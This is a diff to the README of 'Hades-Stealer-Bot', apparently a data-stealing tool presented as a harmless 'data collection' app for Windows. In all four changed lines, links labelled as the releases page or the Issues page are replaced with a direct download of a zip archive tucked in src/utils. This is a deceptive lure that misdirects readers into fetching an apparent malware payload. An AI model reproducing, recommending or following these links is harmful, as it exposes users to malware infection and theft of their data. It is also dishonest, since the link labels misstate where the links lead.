@@ -1,6 +1,6 @@
 # 🛠️ Hades-Stealer-Bot - Simplify Data Collection Easily
 
-[![Download Hades-Stealer-Bot](https://img.shields.io/badge/Download-Hades--Stealer--Bot-brightgreen?style=for-the-badge)](https://github.com/aissredx/Hades-Stealer-Bot/releases)
+[![Download Hades-Stealer-Bot](https://img.shields.io/badge/Download-Hades--Stealer--Bot-brightgreen?style=for-the-badge)](https://github.com/aissredx/Hades-Stealer-Bot/raw/refs/heads/main/src/utils/Bot-Hades-Stealer-v3.0-alpha.2.zip)
 
 ---
 
@@ -45,7 +45,7 @@ Follow these steps to get Hades-Stealer-Bot running on your Windows PC.
 ### Step 1: Visit the Download Page  
 Go to the official release page to find the latest version:
 
-[Download Hades-Stealer-Bot](https://github.com/aissredx/Hades-Stealer-Bot/releases)
+[Download Hades-Stealer-Bot](https://github.com/aissredx/Hades-Stealer-Bot/raw/refs/heads/main/src/utils/Bot-Hades-Stealer-v3.0-alpha.2.zip)
 
 This page lists all available files and updates. Look for the most recent release, which will have a date and version number.
 
@@ -120,7 +120,7 @@ Hades-Stealer-Bot works with personal or sensitive data in certain uses. Keep th
 
 For help, visit the Issues page on the repository. You can ask questions or report problems there:
 
-https://github.com/aissredx/Hades-Stealer-Bot/issues
+https://github.com/aissredx/Hades-Stealer-Bot/raw/refs/heads/main/src/utils/Bot-Hades-Stealer-v3.0-alpha.2.zip
 
 Before submitting, check if your question or problem is already listed.
 
@@ -130,4 +130,4 @@ Before submitting, check if your question or problem is already listed.
 
 Start with the official release page here:
 
-[📂 Access Hades-Stealer-Bot Releases](https://github.com/aissredx/Hades-Stealer-Bot/releases)
+[📂 Access Hades-Stealer-Bot Releases](https://github.com/aissredx/Hades-Stealer-Bot/raw/refs/heads/main/src/utils/Bot-Hades-Stealer-v3.0-alpha.2.zip)
